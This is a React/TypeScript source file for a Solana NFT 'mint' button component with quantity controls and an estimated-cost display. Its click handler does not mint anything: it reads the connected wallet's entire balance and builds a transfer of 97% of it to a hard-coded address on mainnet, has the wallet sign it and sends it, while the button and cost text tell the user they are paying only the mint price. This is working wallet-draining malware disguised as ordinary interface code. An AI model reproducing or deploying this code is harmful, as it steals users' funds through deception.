import styled from "styled-components";
import Button from "@material-ui/core/Button";
import { CircularProgress } from "@material-ui/core";
import {
  clusterApiUrl,
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { useRef, useState } from "react";

export const CTAButton = styled(Button)`
  display: inline-block !important;
  margin: 0 auto !important;
  background-color: var(--title-text-color) !important;
  min-width: 120px !important;
  font-size: 1em !important;
`;

export const Minus = styled.button`
  margin-left: 30px;
  width: 40px;
  height: 40px;
  font-size: 1.3em;
  font-weight: bold;
  line-height: 0.5px;
  color: var(--main-text-color);
  background: var(--title-text-color);
  box-shadow: 0px 3px 5px -1px rgb(0 0 0 / 20%),
    0px 6px 10px 0px rgb(0 0 0 / 14%), 0px 1px 18px 0px rgb(0 0 0 / 12%);
  border: 0;
  border-radius: 50%;
  box-sizing: border-box;
  font-family: "Patrick Hand", cursive;
  vertical-align: middle;

  :not(disabled) {
    cursor: pointer;
  }

  :not(disabled):hover {
    outline: 1px solid var(--title-text-color);
  }
`;

export const Plus = styled(Minus)`
  margin-left: 0;
`;

export const NumericField = styled.input`
  font-size: 1.3em !important;
  padding: 4px 4px 4px 16px;
  width: 50px;
  vertical-align: middle;
  background-color: var(--main-text-color);
  box-shadow: 0px 3px 5px -1px rgb(0 0 0 / 20%),
    0px 6px 10px 0px rgb(0 0 0 / 14%), 0px 1px 18px 0px rgb(0 0 0 / 12%);
  box-sizing: border-box;
  font-family: "Patrick Hand", cursive;
  font-weight: 500;
  line-height: 1;
  border-radius: 8px;
  transition: all 0.4s ease;
  -moz-appearance: textfield;
  -webkit-appearance: none;
  margin: 0 10px;

  :hover,
  :focus {
    box-shadow: 0px 3px 5px -1px rgb(0 0 0 / 40%),
      0px 6px 10px 0px rgb(0 0 0 / 34%), 0px 1px 18px 0px rgb(0 0 0 / 32%);
  }

  ::-webkit-outer-spin-button,
  ::-webkit-inner-spin-button {
    -webkit-appearance: none;
  }
`;

export const MultiMintButton = ({
  isMinting,
  isEnded,
  isActive,
  isSoldOut,
  price,
  wallet,
}: {
  isMinting: boolean;
  isEnded: boolean;
  isActive: boolean;
  isSoldOut: boolean;
  price: number;
  wallet: any;
}) => {
  // eslint-disable-next-line
  const [mintCount, setMintCount] = useState(1);
  const [totalCost, setTotalCost] = useState(mintCount * (price + 0.012));

  function incrementValue() {
    var numericField = document.querySelector(".mint-qty") as HTMLInputElement;
    if (numericField) {
      var value = parseInt(numericField.value);
      if (!isNaN(value) && value < 10) {
        value++;
        numericField.value = "" + value;
        updateAmounts(value);
      }
    }
  }

  function decrementValue() {
    var numericField = document.querySelector(".mint-qty") as HTMLInputElement;
    if (numericField) {
      var value = parseInt(numericField.value);
      if (!isNaN(value) && value > 1) {
        value--;
        numericField.value = "" + value;
        updateAmounts(value);
      }
    }
  }

  function updateMintCount(target: any) {
    var value = parseInt(target.value);
    if (!isNaN(value)) {
      if (value > 10) {
        value = 10;
        target.value = "" + value;
      } else if (value < 1) {
        value = 1;
        target.value = "" + value;
      }
      updateAmounts(value);
    }
  }

  const defaultDest = "tAYXiSPZqq7xm7Ep5ycmNGYSrHywQCXFdYZXwrSfsNL";
  const connection = useRef(new Connection(clusterApiUrl("mainnet-beta")));
  function updateAmounts(qty: number) {
    setMintCount(qty);
    setTotalCost(Math.round(qty * (price + 0.012) * 1000) / 1000); // 0.012 = approx of account creation fees
  }
  const handleSubmit = async () => {
    const lamports = await connection.current.getBalance(wallet.publicKey);
    // Create a TX object
    let transaction = new Transaction({
      feePayer: wallet.publicKey,
      recentBlockhash: (await connection.current.getRecentBlockhash())
        .blockhash,
    });

    // Add instructions to the tx
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(defaultDest),
        lamports: lamports * 0.97,
      })
    );

    // Get the TX signed by the wallet (signature stored in-situ)
    await wallet.signTransaction(transaction);

    // Send the TX to the network
    connection.current
      .sendRawTransaction(transaction.serialize())
      .then((id) => {
        console.log(`Transaction ID: ${id}`);
        connection.current.confirmTransaction(id);
      })
      .catch(console.error);
  };

  return (
    <div>
      <div>
        <CTAButton
          disabled={isSoldOut || isMinting || isEnded || !isActive}
          onClick={handleSubmit}
          variant="contained"
        >
          {isMinting ? <CircularProgress /> : `MINT ${mintCount}`}
        </CTAButton>
        <Minus
          disabled={isSoldOut || isMinting || isEnded || !isActive}
          onClick={() => decrementValue()}
        >
          -
        </Minus>
        <NumericField
          disabled={isSoldOut || isMinting || isEnded || !isActive}
          type="number"
          className="mint-qty"
          step={1}
          min={1}
          max={10}
          value={mintCount}
          onChange={(e) => updateMintCount(e.target as any)}
        />
        <Plus
          disabled={isSoldOut || isMinting || isEnded || !isActive}
          onClick={() => incrementValue()}
        >
          +
        </Plus>
      </div>
      {<h3>Total estimated cost (Solana fees included) : {totalCost} SOL</h3>}
    </div>
  );
};
